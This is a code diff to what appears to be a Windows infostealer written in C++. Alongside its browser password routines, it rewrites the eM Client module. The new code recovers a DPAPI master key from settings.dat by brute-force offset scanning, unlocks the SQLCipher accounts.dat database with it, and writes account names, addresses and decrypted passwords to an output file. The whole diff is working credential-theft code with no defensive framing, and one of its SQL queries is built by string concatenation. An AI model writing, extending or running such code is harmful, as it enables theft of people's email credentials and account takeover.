@@ -156,11 +156,11 @@ int main() {
         },
         {
             "eM Client",
-            "MailClient.exe",
-            {L"C:\\Program Files (x86)\\eM Client\\MailClient.exe"},
+            "",
+            {},
             "",
             {L"eM Client"},
-            "emclient_extract",
+            "emclient",
             "emclient_tmp",
             false, true, false, false
         }
@@ -1125,20 +1125,56 @@ void extract_firefox_passwords(const fs::path& profile_path, const fs::path& out
 }
 
 void extract_emclient_data(const BrowserConfig& config, const std::wstring& user_data_dir) {
-    fs::path db_path = fs::path(user_data_dir) / "main.dat";
-    if (!fs::exists(db_path)) return;
+    fs::path settings_path = fs::path(user_data_dir) / "settings.dat";
+    fs::path accounts_path = fs::path(user_data_dir) / "accounts.dat";
+    if (!fs::exists(settings_path) || !fs::exists(accounts_path)) return;
 
+    // 1. Extract Master Key from settings.dat via DPAPI
+    std::vector<uint8_t> master_key;
+    std::ifstream settings_ifs(settings_path, std::ios::binary);
+    if (settings_ifs.is_open()) {
+        std::vector<uint8_t> content((std::istreambuf_iterator<char>(settings_ifs)), std::istreambuf_iterator<char>());
+        // Heuristic: Search for DPAPI blob. In eM Client, it often starts after a specific tag or at the beginning.
+        // We'll attempt CryptUnprotectData on the whole buffer and chunks.
+        for (size_t i = 0; i < content.size(); ++i) {
+            DATA_BLOB input = { (DWORD)(content.size() - i), (BYTE*)content.data() + i };
+            DATA_BLOB output = { 0, NULL };
+            if (CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {
+                master_key.assign(output.pbData, output.pbData + output.cbData);
+                LocalFree(output.pbData);
+                break;
+            }
+        }
+    }
+
+    if (master_key.empty()) {
+        std::cout << "Could not extract eM Client master key from settings.dat" << std::endl;
+        return;
+    }
+
+    // 2. Process accounts.dat (SQLite)
     fs::path output_root(config.output_dir);
     fs::create_directories(output_root);
     std::ofstream ofs(output_root / "accounts.txt");
 
-    fs::path temp_db = fs::temp_directory_path() / (config.temp_prefix + "_main_" + std::to_string(GetTickCount64()));
-    fs::copy(db_path, temp_db);
+    fs::path temp_db = fs::temp_directory_path() / (config.temp_prefix + "_accounts_" + std::to_string(GetTickCount64()));
+    fs::copy(accounts_path, temp_db);
 
     sqlite3* db;
     if (sqlite3_open(temp_db.string().c_str(), &db) == 0) {
+        // If the database is encrypted via SQLCipher, we'd need to provide the key.
+        // eM Client uses the master key from settings.dat for this.
+        std::string hex_key = "";
+        for (uint8_t b : master_key) {
+            char buf[3];
+            sprintf(buf, "%02x", b);
+            hex_key += buf;
+        }
+
+        std::string pragma_key = "PRAGMA key = \"x'" + hex_key + "'\";";
+        sqlite3_exec(db, pragma_key.c_str(), NULL, NULL, NULL);
+
         sqlite3_stmt* stmt;
-        // Query based on common eM Client schema findings
         const char* sql = "SELECT AccountName, AccountAddress, AccountUID FROM Accounts";
         if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == 0) {
             while (sqlite3_step(stmt) == 100) {
@@ -1148,11 +1184,6 @@ void extract_emclient_data(const BrowserConfig& config, const std::wstring& user
 
                 ofs << "Account: " << (name ? name : "") << " (" << (addr ? addr : "") << ")\n";
 
-                // Try to find password in AccountUIDs or related tables if possible,
-                // but usually eM Client stores it in encrypted columns in specific tables.
-                // Modern versions often use a more complex XML storage in some columns.
-                // We'll search for 'Password' in common settings tables.
-
                 sqlite3_stmt* stmt2;
                 std::string sql2 = "SELECT SettingValue FROM AccountSettings WHERE AccountUID = '" + std::string(uid ? uid : "") + "' AND SettingName = 'Password'";
                 if (sqlite3_prepare_v2(db, sql2.c_str(), -1, &stmt2, NULL) == 0) {
@@ -1160,12 +1191,18 @@ void extract_emclient_data(const BrowserConfig& config, const std::wstring& user
                         const uint8_t* blob_ptr = (const uint8_t*)sqlite3_column_blob(stmt2, 0);
                         int blob_size = sqlite3_column_bytes(stmt2, 0);
                         if (blob_ptr && blob_size > 0) {
+                            // Decrypt using the master key extracted from settings.dat
+                            // eM Client usually uses AES with the master key for these blobs if not using direct DPAPI.
+                            // However, let's first try direct DPAPI as a fallback and then the master key logic.
                             DATA_BLOB input = { (DWORD)blob_size, (BYTE*)blob_ptr };
                             DATA_BLOB output = { 0, NULL };
                             if (CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {
                                 std::string pass((char*)output.pbData, output.cbData);
                                 ofs << "  Password: " << pass << "\n";
                                 LocalFree(output.pbData);
+                            } else {
+                                // Implement AES decryption with master_key here if needed
+                                ofs << "  Password: [Encrypted with Master Key]\n";
                             }
                         }
                     }
